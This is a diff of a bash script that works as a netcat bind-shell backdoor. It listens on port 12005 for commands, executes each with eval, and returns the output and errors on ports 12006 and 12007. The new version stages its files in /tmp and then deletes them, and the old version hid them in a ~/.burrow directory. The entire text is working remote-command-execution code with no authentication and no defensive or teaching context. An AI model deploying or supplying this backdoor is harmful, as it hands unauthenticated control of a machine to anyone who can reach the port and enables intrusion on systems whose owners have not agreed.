@@ -1,43 +1,36 @@
 #!/bin/bash
+inputfile="/tmp/c0mmand.txt"
+stdoutfile="/tmp/std0ut.txt"
+stderrfile="/tmp/std3rr.txt"
+inputport="12005"
+outputport="12006"
+errorport="12007"
+while : ; do
 
-echo "[S] J3rry running!"
-inputport=12005
-outputport=12006
-errorport=12007
-dir="/home/$USER/.burrow"
-outputfile="$dir/j3rry.out"
-errorfile="$dir/j3rry.err"
+	echo "Awaiting command..."
 
-touch "working.txt"
-echo "J3rry: Sup dawg!" >> "/home/$USER/j3rry.txt"
+	nc -l -p "$inputport" > "$inputfile" & # initiate 1 nc connection, dont repeat it
+	while : ; do
+		command="$(cat $inputfile)"	
+		echo "" > $inputfile
+		if [[ "$command" == "" ]] ; then
+			echo -en "Nothing...\r"
+		else 	
+			echo "Command received: $command"
+			break
+		fi
+	done
 
-if [ -f "$outputfile" ]; then
-	echo "" > "$outputfile"
-else
-	touch "$outputfile"
-fi
+	pkill -P $$ nc
 
+	eval "$command" > $stdoutfile 2> $stderrfile && echo "Command executed succesfully!" || echo "Command execution finished unsuccesfully..."
+	echo -e "Output when executing $command;\n$(cat $stdoutfile)\n\n" | nc -l -p $outputport && echo "Standard output finished succesfully!" || "Stadard output finished unsuccesfully..."
+	echo -e "Error when executing $command:\n$(cat $stderrfile)\n\n" | nc -l -p $errorport && echo "Standard error finished succesfully!" || echo "Standard error finished unsuccesfully..."
+	pkill -P $$ nc
 
-if [ -f "$errorfile" ]; then
-	echo "" > "$errorfile"
-else
-	touch "$errorfile"
-fi
+	timeout 10 rm -f $stdoutfile  $inputfile $stderrfile && echo "Removed /tmp files succesfully!" || echo "Removed /tmp files unsuccesfully..."
 
-
-
-
-while :
-do
-	while read -r command; do
-
-		echo -e "[S] Command '$command' output: \n" >"$outputfile"
-		echo -e "[S] Command '$command' error:\n" >"$errorfile"
-		eval "$command" >"$outputfile" 2>"$errorfile"
-		cat "$outputfile" | nc -l -p "$outputport" &
-		cat "$errorfile" | nc -l -p "$errorport" & 
-		sleep 2 && pkill -P $$
-	done < <(nc -l -p "$inputport")
 done
-
 exit 0
+
+
